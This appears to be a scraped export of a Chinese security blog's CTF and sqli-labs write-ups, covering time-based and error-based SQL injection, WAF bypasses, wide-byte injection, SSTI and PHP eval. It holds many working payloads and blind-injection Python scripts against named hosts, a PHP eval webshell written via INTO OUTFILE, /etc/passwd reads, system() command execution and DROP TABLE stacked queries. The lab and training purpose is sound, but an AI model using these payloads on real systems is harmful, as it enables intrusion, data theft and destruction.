前言完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&gt;。 0x01 sleep()最常见的时间注入方式，sleep(n)让语句运行n秒中。配合if语句 …if(1,sleep(3),0)…或者select case when 语句。不做深入研究。1234567mysql&gt; select sleep(3);+----------+| sleep(3) |+----------+| 0 |+----------+1 row in set (3.00 sec) 0x02 BENCHMARK()BENCHMARK函数执行某函数的次数BENCHMARK(n,SHA1(‘asd’))n=次数，代表执行SHA1(‘asd’)n次，当n到达一定程度时会造成和sleep()一样的效果123456789101112131415mysql&gt; select BENCHMARK(10000000,SHA1('1'));+-------------------------------+| BENCHMARK(1000000,SHA1('1')) |+-------------------------------+| 0 |+-------------------------------+1 row in set (0.24 sec)mysql&gt; select BENCHMARK(10000000,SHA1('1'));+-------------------------------+| BENCHMARK(10000000,SHA1('1')) |+-------------------------------+| 0 |+-------------------------------+1 row in set (2.44 sec) 0x03 笛卡尔积通过对一张表作自身的笛卡尔积让查询时间变长从而达到和sleep一样的效果这里用information_schema.columns表做笛卡儿积123456789101112131415mysql&gt; select count(*) from information_schema.columns; //+----------+| count(*) |+----------+| 3095 |+----------+1 row in set (0.05 sec)mysql&gt; select count(*) from information_schema.columns ,information_schema.columns qwe;+----------+| count(*) |+----------+| 9579025 |+----------+1 row in set (0.38 sec) 可以看到做一次笛卡儿积后时间翻了很多倍。1mysql&gt; select count(*) from information_schema.columns ,information_schema.columns qwe ,information_schema.columns wer; 两次笛卡儿积可以直接把数据库打挂。 0x04 get_lockGET_LOCK(str,timeout);先锁定一个变量 : GET_LOCK(‘altman’,1)再使用另一个session执行函数 : GET_LOCK(‘altman’,5)会产生一个5秒的停滞。本地测试一下。1234567891011121314151617mysql&gt; select GET_LOCK('qwe',1);+-------------------+| GET_LOCK('qwe',1) |+-------------------+| 1 |+-------------------+1 row in set (0.00 sec)//再打开另一个MYSQL命令行mysql&gt; select get_lock('qwe',5);+-------------------+| get_lock('qwe',5) |+-------------------+| 0 |+-------------------+1 row in set (5.00 sec) 造成的与sleep(5)相同的效果 0x05实战pwnhub上的sql题。给出了源码。123456789101112131415&lt;?phprequire 'conn.php';$id = $_GET['id'];if(preg_match(\"/(sleep|benchmark|outfile|dumpfile|load_file|join)/i\", $_GET['id']))&#123; die(\"you bad bad!\");&#125;$sql = \"select * from article where id='\".intval($id).\"'\";$res = mysql_query($sql);if(!$res)&#123; die(\"404 not found!\");&#125;$row = mysql_fetch_array($res, MYSQL_ASSOC);mysql_query(\"update view set view_times=view_times+1 where id = '\".$id.\" '\");?&gt; 注入点很明显的时间盲注1mysql_query(\"update view set view_times=view_times+1 where id = '\".$id.\" '\"); 但是sleep,BENCHMARK被正则了 这里分别用 笛卡儿积，get_lock三种方法尝试。 笛卡儿积先尝试payload:1id=%27or%20(select%20if(1,(select%20count(*)%20from%20information_schema.columns,%20information_schema.columns%20T1,%20information_schema.columns%20T2,%20information_schema.columns%20T3),0))%23 成功造成停滞 ok ！接下来写python脚本1234567891011121314151617# encoding=utf-8import requestsimport stringurl = 'http://219.219.61.234:20262/article.php?id='flag = ''for i in range(1, 50): for j in string.letters+'123456789'+'&#123;&#125;!@#$%^&amp;*()_': url1 = url + \"' or (select if(((select ascii(substr(group_concat(table_name),\" + str(i) + \",1)) from information_schema.tables where table_schema=database() )='\" + str(ord(str(j))) + \"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23\" #url1 = url + \"' or (select if(((select ascii(substr(group_concat(column_name),\" + str(i) + \",1)) from information_schema.columns where table_schema=database() and table_name='flag')='\" + str(ord(str(j))) + \"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23\" #url1 = url + \"' or (select if(((select ascii(substr(flag,\" + str(i) + \",1)) from flag)='\" + str(ord(str(j))) + \"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23\" try: r = requests.get(url1, timeout=2) except: flag += str(j) break print flag get_lock先注入1id=%27%20or%20get_lock(%27altman%27,1)%23 然后更换IP访问或者等一会之后访问从而使得MYSQL的session改变1id=%27%20or%20get_lock(%27altman%27,5)%23 成功造成5s延迟。接下来运行python脚本123456789101112131415# encoding=utf-8import requestsimport stringurl = 'http://219.219.61.234:20262/article.php?id='flag = ''for i in range(1, 50): for j in string.letters+'123456789'+'&#123;&#125;!@#$%^&amp;*()_': url1 = url + \"' or (select if(((select ascii(substr(flag,\" + str(i) + \",1)) from flag)='\" + str(ord(str(j))) + \"'),(get_lock('altman',7)),1))%23\" try: r = requests.get(url1, timeout=3) except: flag += str(j) break print flag","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"实验吧几道注入题","slug":"实验吧几道注入题","date":"2018-03-08T05:06:57.000Z","updated":"2018-11-02T05:50:01.442Z","comments":true,"path":"2018/03/08/实验吧几道注入题/","link":"","permalink":"http://altman.vip/2018/03/08/实验吧几道注入题/","excerpt":"0x1 加了料的报错注入url=http://ctf5.shiyanbar.com/web/baocuo/index.php提示了是报错注入，进行了一波FUZZ:username过滤了 =#-()","text":"0x1 加了料的报错注入url=http://ctf5.shiyanbar.com/web/baocuo/index.php提示了是报错注入，进行了一波FUZZ:username过滤了 =#-()password过滤了所有报错函数名 ExtractValue、UpdateXml等,substr mid left right union limit like。再结合提示的sql语句：1$sql=\"select * from users where username='$username' and password='$password'\" 我们可以将函数名放在username，()放在password里，构造：1username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or ' 这样sql语句就变成了1$sql=\"select * from users where username='' or updatexml/*' and password='*/(1,concat(0x3a,(select user())),1) or ''\" 注释掉了中间的内容并且绕过了waf。因为过滤了like和= ，这里用regexp代替12345username=' or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or ' //ffll44jj,usersusername=' or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'),0x7e),1) or ' //valueusername=' or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(value) from ffll44jj),0x7e),1) or ' //flag&#123;err0r_b4sed_sqli_+_hpf&#125; 另外 看了Pcat大佬的WP，发现password处EXP没有过滤，可以直接在password处注入123username=&amp;password='or exp(~(select*from(select user())x)) or 'username=&amp;password='or exp(~(select*from(select group_concat(value) from ffll44jj)x)) or ' 0x2 认真一点url=http://ctf5.shiyanbar.com/web/earnest/index.php明显的BOOL盲注payload:1id=0'oorr'1'='1 过滤了一大堆东西用括号代替空格，双写or绕过，过滤了逗号，mid无法使用，只能用regexp倒叙匹配。python脚本:1234567891011121314151617import requestsimport stringurl = \"http://ctf5.shiyanbar.com/web/earnest/index.php\"flag=\"\"for i in range(1,30): for j in string.letters+\"0123456789\"+\"!@#^&amp;()&#123;&#125;=+`~_,/.\": #payload=\"0'oorr(select(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))regexp('%s$'))oorr'1'='\" //fiaguser #payload=\"0'oorr(select(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag')regexp('%s$'))oorr'1'='\" //fl$4g payload=\"0'oorr(select(select(fl$4g)from(fiag))regexp('%s$'))oorr'1'='\"%(j+flag) data = &#123; \"id\":payload &#125; r =requests.post(url=url,data=data) if 'You are in' in r.content: flag = j+flag print flag break print i 将逗号放到最后因为逗号*和$是通配符，如果出现了这几个符号，就要猜他到底是什么了。。。还没想到更准确的方法。得出flag：flag{haha~you win!} 0x3 who are you首页显示IP，抓包修改XFF，果然ip是从XFF处取值。尝试1X-FORWARDED-FOR:' or sleep(5) or '1'='1 sleep成功，尝试时间盲注发现逗号被过滤了。那么用select case when最终payload1X-FORWARDED-FOR:' or (select case when (1) then sleep(5) end) or '1'='1 附上盲注脚本:123456789101112131415161718192021 # -*- coding: UTF-8 -*-import requestsimport stringurl = \"http://ctf5.shiyanbar.com/web/wonderkun/index.php\"#payload=\"' or+(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1\"#payload=\"' or+(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1\"payload = \"' or+(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1\"flag = \"\"for i in range(0,33): for j in string.letters+\"0123456789\"+\"!@#^&amp;()&#123;&#125;=+`~_,/.\": payload1 = payload%(i,j) header=&#123; \"X-Forwarded-For\":payload1 &#125; try: r = requests.get(url=url,timeout=4,headers=header) except: flag+=j print flag break print i","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"hgame-week4","slug":"hgame-week4","date":"2018-03-02T16:00:00.000Z","updated":"2018-11-02T05:48:50.230Z","comments":true,"path":"2018/03/03/hgame-week4/","link":"","permalink":"http://altman.vip/2018/03/03/hgame-week4/","excerpt":"HGAME的第四周，难度变大了，记录一下做题过程。","text":"HGAME的第四周，难度变大了，记录一下做题过程。 又双叒叕是SQLI提示在线编辑，很明显是index.php~源代码泄露。拿到文件:12345678910111213141516171819202122232425&lt;?php error_reporting(0); include(\"sql.php\"); $waf=\"/(union|group by|=|&gt;|&lt;|hex| |lower|strcmp|updatexml|xmlelement|extractvalue|concat|bin|sleep|mid\\(|substr|left|ascii|\\/\\*|\\*\\/)/i\"; if(isset($_GET['user']))&#123; if(preg_match_all($waf,$_GET['user'])!=0)&#123; $user=\"admin\"; &#125;else&#123; $user = str_replace(\"'\",\"\\'\",$_GET['user']); &#125; //echo $user.\"&lt;br&gt;\"; $sqli = new mysqli($host,$username,$passwd,$database); $sqli-&gt;set_charset(\"gbk\"); $query=\"select * from users where username='\".$user.\"'\"; $result = $sqli-&gt;query($query); //echo $sqli-&gt;error; $num=0; @$num = $result-&gt;num_rows; if($num&gt;0)&#123; while($row = $result-&gt;fetch_row())&#123; echo $row[0].\"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;\".$row[1].\"&amp;nbsp;&amp;nbsp;&amp;nbsp;\".$row[2].\"&lt;br&gt;\"; &#125; &#125; &#125; 注意到GBK，尝试GBK注入。过滤了空格 用%0a代替1http://118.25.18.223:10088/?user=%df%27or%0a1%0alike%0a1%23 过滤了Union，没有报错。只能尝试盲注。由于没有过滤like，用%通配符就行爆破。贴python脚本:123456789101112131415161718import requestsimport stringurl = \"http://118.25.18.223:10088/?user=\"flag = \"\"flag1 = \"\"for i in range(1,100): for j in string.letters+\"0123456789\"+\"!@#$^&amp;*()&#123;&#125;=+`~_\": #payload = \"%%df%%27%%0aor%%0a((select%%0adatabase())%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #payload = \"%%df%%27%%0aor%%0a((select%%0aTABLE_NAME%%0afrom%%0ainformation_schema.TABLES%%0awhere%%0aTABLE_SCHEMA%%0alike%%0adatabase()limit%%0a0,1)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #payload = \"%%df%%27%%0aor%%0a((select%%0aCOLUMN_NAME%%0afrom%%0ainformation_schema.COLUMNS%%0awhere%%0aTABLE_NAME%%0alike%%0a0x666c6c6c6c6c6167%%0alimit%%0a2,1)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) payload = \"%%df%%27%%0aor%%0a((select%%0athisisflag%%0afrom%%0aflllllag)%%0alike%%0a0x%s25)%%23\"%(flag+hex(ord(j))[2:]) url1=url+payload r =requests.get(url=url1) if 'chutiren' in r.content: flag += hex(ord(j))[2:] flag1 += j print flag1 break 散落的flagflag被分为了三段第一段在注册页面，抓包发送后可以拿到验证码。注册成功后登陆，看到第一段flag。123456User Infoaltmanusername: altmansecret: hgame&#123;0102940de1 然后寻找第二段fla重新登陆注册的账号，抓包发现check_user.php修改username=admin出现第二段flag1234567User Infoaltmanusername: adminsecret: 10c546b2cf68 然后修改密码，抓包后改username为admin然后登陆admin拿到第三段flagcongratulation you get The last flag:|98924acfce}|(竖线内的内容为最后一段flag)拼接后得到flag 奇怪的SQLi600分的题有点吓人。。SSRF攻击mysql当时没做出来，现在题目关了。有机会再补上。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"SSTI（服务端模板注入攻击 ）","slug":"SSTI","date":"2018-02-23T16:32:32.000Z","updated":"2018-11-02T05:46:43.125Z","comments":true,"path":"2018/02/24/SSTI/","link":"","permalink":"http://altman.vip/2018/02/24/SSTI/","excerpt":"源自HGAME-week3的一道题 NGC’S BLOG","text":"源自HGAME-week3的一道题 NGC’S BLOGurl:1http://111.230.105.104:5000/hello/ngc 学习一波ssti参考链接 http://www.freebuf.com/vuls/83999.html http://www.freebuf.com/articles/web/135953.html http://www.freebuf.com/articles/web/98928.html这道题解法:尝试SSTI注入:1http://111.230.105.104:5000/%7B%7B1+1%7D%7D 返回 2 。 说明存在注入 。1234http://111.230.105.104:5000/%7B%7B1+1%7D%7Dhttp://111.230.105.104:5000/%7B%7B''.__class__.__mro__%7D%7Dhttp://111.230.105.104:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()%20%7D%7Dhttp://111.230.105.104:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()%20%7D%7D //读文件 提示了flag在flag中1http://111.230.105.104:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('./flag').read()%20%7D%7D","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs(less54-less65)","slug":"sqli-labs 4","date":"2018-02-09T17:14:43.000Z","updated":"2018-11-02T05:47:03.273Z","comments":true,"path":"2018/02/10/sqli-labs 4/","link":"","permalink":"http://altman.vip/2018/02/10/sqli-labs 4/","excerpt":"从这部分开始题目看起来都比较有趣这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。","text":"从这部分开始题目看起来都比较有趣这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。 less-54尝试闭合 直接成功1234567?id=1' or 1=1 %23?id=1' order by 3 %23?id=1' order by 4 %23 //爆出字段?id=-1' union select 1,2,database() %23 //爆出库名?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23 //爆表?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6b6179736a6d316c6c6c) %23 //爆字段?id=-1' union select 1,2,(select group_concat(secret_IC58) from kaysjm1lll) %23 //爆flag 一共用了7次 爆出flag：Qn53kV6NaD4ffFR1BSA3sBkp（每次的数据库名表名字段名和flag都是不一样的） less-55和上面一样的套路，只是把单引号换成了括号payload:1?id=1) or 1=1 %23 less-56常规思路进行尝试 得到payload：1?id=1') or 1=1 %23 其他的就是常规暴库 less -57一样的套路 只不过变成了双引号1?id=1\" or 1=1 %23 less-58单引号闭合 报错注入1?id=1' or updatexml(1,concat(0x7e,database(),0x7e),1) %23 成功爆出库名。然后就是报错的常规操作了。 less-59没有符号闭合的报错注入 :1?id=1 or updatexml(1,concat(0x7e,database(),0x7e),1) %23 less-601?id=1\") or updatexml(1,concat(0x7e,database(),0x7e),1) %23 less-611?id=1')) or updatexml(1,concat(0x7e,database(),0x7e),1) %23 less-62130次的限制，盲注 。但是遇到了问题就是，盲注次数控制不了在130以内，这就很头疼。payload:1?id=1') and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 less-63只是换了闭合符号payload:1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 less -641?id=1)) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 less -651?id=1\") and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 总结终于做完了65关 ，看着很多，其实做起来很快。本来以前后面会比较难，其实很基础，重复的题目太多了。目前不懂得地方就是限制次数的盲注脚本。还没有想到什么好的办法，以后想到了会回来补上脚本的。OVER。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs (less39-less53)","slug":"sqli-labs 3","date":"2018-02-09T15:38:18.000Z","updated":"2018-11-02T05:51:40.526Z","comments":true,"path":"2018/02/09/sqli-labs 3/","link":"","permalink":"http://altman.vip/2018/02/09/sqli-labs 3/","excerpt":"less-39直接闭合:1?id=1 or 1=1 %23","text":"less-39直接闭合:1?id=1 or 1=1 %23 less-4039题的盲注 脚本:123456789101112#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-40/?id=1' and ascii(mid((select password from users where username='admin2' ),%d,1))=%d and '1'='1\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag break less-41依旧盲注,和上题一样，不需要单引号闭合。 less-42堆叠注入。 在;后构造新的语句造成执行。比如输入1usernma=123';create table haha like users; 在查询后执行创造表的指令。这道题堆叠注入的点在于password，用户名任意输，密码处构造注入1login_user=123&amp;login_password=123';create table hahah like users#&amp;mysubmit=Login 这时候去后台查表发现已经存在hahah表了。用样可以利用1login_user=123&amp;login_password=123';drop table hahah#&amp;mysubmit=Login 删除hahah表。这里我们用指令创造一个账号登陆payload:1login_user=123&amp;login_password=123';insert into users(id,username,password) values ('100','altman','altman')##&amp;mysubmit=Login 这个任意指令执行还是很危险的。 less-43和上题的区别就是需要加括号闭合。1login_user=123&amp;login_password=123');drop table hahah#&amp;mysubmit=Login less-44和42题没啥区别 less-45和43题没啥区别 想了想比赛应该不会出这种堆叠注入，过滤稍微不严格的话整个数据库就要被删掉。。。也可以直接getshell less-46基于错误的排序注入看了下源码:1$sql = \"SELECT * FROM users ORDER BY $id\"; 尝试：1?sort=updatexml(1,concat(0x7e,database(),0x7e),1) 成功 less-47增加了单引号闭合：1?sort=1' and updatexml(1,concat(0x7e, database(),0x7e),1) and '1'='1 less-48盲注 ，各种尝试后没有结果。去方方土博客看了看发现需要时间盲注 脚本:1234567891011121314# Author:sky# -*- coding: utf-8 -*-import requestsflag = ''url = 'http://localhost/sql/Less-48/?sort=1 and if(((ascii(substr((select password from users where username=\"admin2\"),%s,1)))=%d),sleep(2),false)'for x in range(1,100): for y in range(33,127): urll = url%(x,y) try: f = requests.get(url=urll,timeout=1.5) except: flag+=chr(y) print flag break less-4947题的盲注版本 一样用时间盲注 less-50排序注入后加了堆叠注入 Less-51同上题，需要引号闭合 Less-5250的盲注，同时间注入，脚本懒得写。。。 Less-5351的盲注，时间注入","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs (less23-less38)","slug":"sqli-labs 2","date":"2018-02-05T16:00:00.000Z","updated":"2018-11-02T05:51:50.421Z","comments":true,"path":"2018/02/06/sqli-labs 2/","link":"","permalink":"http://altman.vip/2018/02/06/sqli-labs 2/","excerpt":"less-231?id=1' or '1'=' 成功闭合payload：1?id=1' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or '1'='1","text":"less-231?id=1' or '1'=' 成功闭合payload：1?id=1' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or '1'='1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1' || updatexml(1,concat(0x7e,(select user()),0x7e),1)) or '1'='1 而且他只是过滤删去了or，可以重写绕过。 less-25a上题的基础下进行盲注入脚本如下：12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-25a/?id=-1 || ascii(mid((select passwoorrd from users where username='admin2'),%d,1))=%d\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag breakprint result less-26空格绕过 用()绕过空格就好了1?id=1'||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'1'='1 less-26a上一题的忙注版本12345678910import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-26a/?id=1'anandd(ascii(mid((select(passwoorrd)from(users)where(username='admin2')),%d,1))=%d)anandd'1'='1\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag break less-27过滤并不严格123456789101112$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union/s',\"\", $id); //Strip out union$id= preg_replace('/select/s',\"\", $id); //Strip out select$id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION$id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT$id= preg_replace('/Union/s',\"\", $id); //Strip out Union$id= preg_replace('/Select/s',\"\", $id); //Strip out select 大小写绕过就行1?id=1'and(updatexml(1,concat(0x7e,(sEleCt(password)from(users)where(username='admin2')),0x7e),1))and'1'='1 less-27a依旧是27题的盲注，就不写了 less-28试了半天没回显 最后发现是个盲注 //不按套路走 不是加a才是盲注的吗= =脚本：123456789101112#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-28/?id=1')and(ascii(mid((sElEct(password)from(users)where(username='admin2')),%d,1))=%d)and('1'='1\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag break less-28a没看出来和28有啥区别 用28的脚本也能跑出来。。 less-29很轻松就饶过了。。我咋没看出来the best firewall在哪。。。？1?id=1' or updatexml(1,concat(0x7e,(select password from users where username='admin2'),0x7e),1) %23 看了源码 在login.php中，他会先将参数放入数组，然后读取语句的时候取数组第一个值，对id[1]进行过滤。但是如果我们传入两个id=1&amp;id=2，sql查询的时候会取第二个参数，这样就能绕过waf1?id=1&amp;id=-1' union select 1,2,3 %23 less-30上一题的盲注版本，脚本不写了 less-31和30题同解。。. less-32宽字节注入单引号前被加了反斜杠转义，无法正常闭合。但是如果使用了GBK编码，那么%df%5c会被认为是一个字，就可以使单引号逃逸。payload:1http://127.0.0.1/sql/Less-32/?id=1%df%27 or updatexml(1,concat(0x7e,user(),0x7e),1)%23 less-33和上题一样 less-34依旧是宽字节：1uname=1%df' or 1=1 %23&amp;passwd=1&amp;submit=Submit less-351http://127.0.0.1/sql/Less-35?id=1 or updatexml(1,concat(0x7e,user(),0x7e),1) %23 less-36还是宽字节1http://127.0.0.1/sql/Less-36?id=1%df' or updatexml(1,concat(0x7e,user(),0x7e),1) %23 看了下源码，这几个题的不同就在于加反斜杠用了好几种不同的函数。 less-37依旧是1uname=%df' or updatexml(1,concat(0x7e,(user()),0x7e),1)%23&amp;passwd=1&amp;submit=Submit less-38没看懂他的考点在哪，很轻易就注入成功12?id=1' or 1=1 %23?id=-1' union select 1,2,database()%23","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs (less1-less22)","slug":"sqli-labs 1","date":"2018-02-04T16:00:00.000Z","updated":"2018-11-02T05:48:06.083Z","comments":true,"path":"2018/02/05/sqli-labs 1/","link":"","permalink":"http://altman.vip/2018/02/05/sqli-labs 1/","excerpt":"用sqlilabs来练练注入环境很好配置 网上很多教程","text":"用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1' or 1=1 %23 爆字段：12?id=1' order by 3 %23?id=1' union select 1,2,3 %23 爆表名：1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1%23 爆列名：1?id=-1' union select 1,2,column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1%23 查看用户名密码：1id=-1' union select 1,2,concat_ws(char(32,32,32),id,username,password) from users limit 0,1 %23 (后面只记录payload 暴库方法都差不多) less-2数字型1?id=1 or 1=1%23 less-3字符型单引号变形查询语句1Select login_name, select password from table where id= (‘id’) 用’)闭合1?id=1') or 1=1 %23 less-41?id=1\") or 1=1 %23 less-5单引号报错注入1?id=1'or 1=1 --+ payload1?id=1' union select count(*),1, concat(' ',(select user()), ' ',floor(rand()*2)) as b from information_schema.tables group by b%23 试了试其他的报错:123?id=1' or (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23?id=1' or (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23 都可以但是1?id=1' or exp(~(select * from (select database())a))%23 这个语句在wamp环境下爆不出来在lamp下就可以 没研究懂为啥。。。 less-61?id=1\" or 1=1 %23 less-7导出文件GET字符型注入 这个需要先找到根目录@@datadir 读取数据库路径@@basedir MYSQL 获取安装路径然后把查询结果导入到一个文件里 比如把一句话木马导入到php文件里payload:1id=1')) union select 1,'2','&lt;?php @eval($_POST[\"a\"]);?&gt;' into outfile 'E:\\\\wamp\\\\www\\\\sqli-labs\\\\a.php' %23 然后菜刀就OK less-8布尔盲注1?id=1' and ascii(substr((select database()),1,1))=115 %23 //数据库第一位是s ascii码是115 找到payload后写个脚本跑就可以了 less-9单引号时间盲注1?id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23 less-10双引号时间盲注1?id=1\" and if(ascii(substr(database(),1,1))=115,sleep(3),0) %23 less-111uname=Dhakkan' or '1'='1 less-121username=Dhakkan\") or (\"1\")=(\"1 less-131admin') or ('1')=('1 less-141admin\" or \"1\"=\"1 less-151admin' or 1=1# less-161admin\") or 1=1# less-17在password处报错注入12uname=adminpasswd=' or (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23 less-18这关看了半天源码才会 先查数据库找到用户名密码登陆进去回显：1Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0 在UA头处进行注入 单引号尝试一下：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '127.0.0.1', 'admin')' at line 1 然后试试报错注入1User-Agent:'or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or '1'='1 成功爆出用户名 剩下的就是常规操作了 less-19只是把注入点换到了Referer头中，其他的完全一样 less-20登录后看到重点是在cookie里，加入单引号后报错尝试：1Cookie: uname='or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or '1'='1 成功 其他的和上面一样 less-21只是在20题的基础上进行了base64编码1Cookie: uname=dW5hbWU9J29yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgJzEnPScx less-2220题的基础上，将单引号变成双引号1uname=dW5hbWU9Im9yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgIjEiPSIx less-23","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"hitctf-web","slug":"hitctf2018","date":"2018-02-02T16:00:00.000Z","updated":"2018-11-02T05:48:41.974Z","comments":true,"path":"2018/02/03/hitctf2018/","link":"","permalink":"http://altman.vip/2018/02/03/hitctf2018/","excerpt":"哈工大新生赛复现一波","text":"哈工大新生赛复现一波 PHPreading扫描目录发现源码备份index.php.bak123&lt;?php eval(base64_decode('JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw=='))?&gt; 解码后提交?asdfgjxzkallgj8852=H1TctF2018EzCTF拿到flag BabyEval给了源码1http://120.24.215.80:10013/?str=$&#123;phpinfo()&#125; 可以执行 那么久构造命令12http://120.24.215.80:10013/?str=$&#123;system($_GET[a])&#125;&amp;a=lshttp://120.24.215.80:10013/?str=$&#123;system($_GET[a])&#125;&amp;a=cat%20../../../162920976d9c04ac69e2f4392a8cffbf_flag.txt 或者这样也行1http://120.24.215.80:10013/?str=$&#123;var_dump(`ls`)&#125; BabyLeakage提示在/news/about尝试debug随便输入一个/news/admin 发现报错 给了很多目录尝试/news/auth/ 居然发现了mysql账户密码。。。？？？3306连接进去找到了flag BabyInjection方法一给了源码 发现他的waf基本让人无处下手123456789101112131415$query = \"SELECT * FROM users WHERE username='&#123;$username&#125;';\";echo $query.\"&lt;br&gt;\";$query = mysqli_query($conn, $query);if (mysqli_num_rows($query) == 1)&#123; $result = mysqli_fetch_array($query); if ($result['passwd'] == $passwd)&#123; die('you did it and this is your flag: '.$flag); &#125; else&#123; die('Wrong password'); &#125;&#125;else&#123; die('Wrong username');&#125; 只需要做到mysql根据username查询到的密码和我们的输入一样就可以了如果我们使用语句1select * from users where id=1 group by passwd with rollup with rollup会产生一个passwd值为NULL的行我们可以根据这点让他返回passwd=NULL的那一行用’=’’绕过用户名 构造语句1select * from users where username=''='' group by passwd with rollup limit 0,1 # 但是limit也不能用 我们可以用having最终payload1select * from users where username=''='' group by passwd with rollup having passwd is NULL # PASSWD交空就行了。 PS：这里没有想明白 select * from users where username=’’=’’ 中 username=’’=’’ 的逻辑问题本地进行了一波研究1select * from users where id=''='' 全表返回1234select * from users where id='0'=''select * from users where id=''='0'select * from users where id=''=0select * from users where id=''='a' 都是全表返回查看官方文档 字符串在 = 